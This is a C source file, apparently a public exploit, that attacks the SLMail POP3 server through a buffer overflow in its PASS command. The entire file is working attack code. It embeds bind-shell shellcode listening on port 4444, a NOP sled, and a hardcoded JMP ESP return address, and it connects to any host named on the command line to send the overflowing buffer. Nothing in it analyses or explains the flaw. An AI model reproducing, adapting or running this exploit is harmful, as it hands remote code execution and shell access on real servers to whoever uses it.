/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444
unsigned char shellcode[] =
"\xd9\xce\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x52\xba\x17\x55\x87"
"\x9d\x83\xc5\x04\x31\x55\x13\x03\x42\x46\x65\x68\x90\x80\xeb"
"\x93\x68\x51\x8c\x1a\x8d\x60\x8c\x79\xc6\xd3\x3c\x09\x8a\xdf"
"\xb7\x5f\x3e\x6b\xb5\x77\x31\xdc\x70\xae\x7c\xdd\x29\x92\x1f"
"\x5d\x30\xc7\xff\x5c\xfb\x1a\xfe\x99\xe6\xd7\x52\x71\x6c\x45"
"\x42\xf6\x38\x56\xe9\x44\xac\xde\x0e\x1c\xcf\xcf\x81\x16\x96"
"\xcf\x20\xfa\xa2\x59\x3a\x1f\x8e\x10\xb1\xeb\x64\xa3\x13\x22"
"\x84\x08\x5a\x8a\x77\x50\x9b\x2d\x68\x27\xd5\x4d\x15\x30\x22"
"\x2f\xc1\xb5\xb0\x97\x82\x6e\x1c\x29\x46\xe8\xd7\x25\x23\x7e"
"\xbf\x29\xb2\x53\xb4\x56\x3f\x52\x1a\xdf\x7b\x71\xbe\xbb\xd8"
"\x18\xe7\x61\x8e\x25\xf7\xc9\x6f\x80\x7c\xe7\x64\xb9\xdf\x60"
"\x48\xf0\xdf\x70\xc6\x83\xac\x42\x49\x38\x3a\xef\x02\xe6\xbd"
"\x10\x39\x5e\x51\xef\xc2\x9f\x78\x34\x96\xcf\x12\x9d\x97\x9b"
"\xe2\x22\x42\x0b\xb2\x8c\x3d\xec\x62\x6d\xee\x84\x68\x62\xd1"
"\xb5\x93\xa8\x7a\x5f\x6e\x3b\x8f\xab\x70\xf4\xe7\xa9\x70\x1b"
"\xa4\x24\x96\x71\x44\x61\x01\xee\xfd\x28\xd9\x8f\x02\xe7\xa4"
"\x90\x89\x04\x59\x5e\x7a\x60\x49\x37\x8a\x3f\x33\x9e\x95\x95"
"\x5b\x7c\x07\x72\x9b\x0b\x34\x2d\xcc\x5c\x8a\x24\x98\x70\xb5"
"\x9e\xbe\x88\x23\xd8\x7a\x57\x90\xe7\x83\x1a\xac\xc3\x93\xe2"
"\x2d\x48\xc7\xba\x7b\x06\xb1\x7c\xd2\xe8\x6b\xd7\x89\xa2\xfb"
"\xae\xe1\x74\x7d\xaf\x2f\x03\x61\x1e\x86\x52\x9e\xaf\x4e\x53"
"\xe7\xcd\xee\x9c\x32\x56\x0e\x7f\x96\xa3\xa7\x26\x73\x0e\xaa"
"\xd8\xae\x4d\xd3\x5a\x5a\x2e\x20\x42\x2f\x2b\x6c\xc4\xdc\x41"
"\xfd\xa1\xe2\xf6\xfe\xe3";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3035];
      char buf[3046];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3046);
      memset(evil, 0x00, 3035);
      memset(evil, 0x43, 3034);
      ptr = &evil;
      ptr = ptr + 652; // 2608
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);

      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP XP 5f4a358f FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
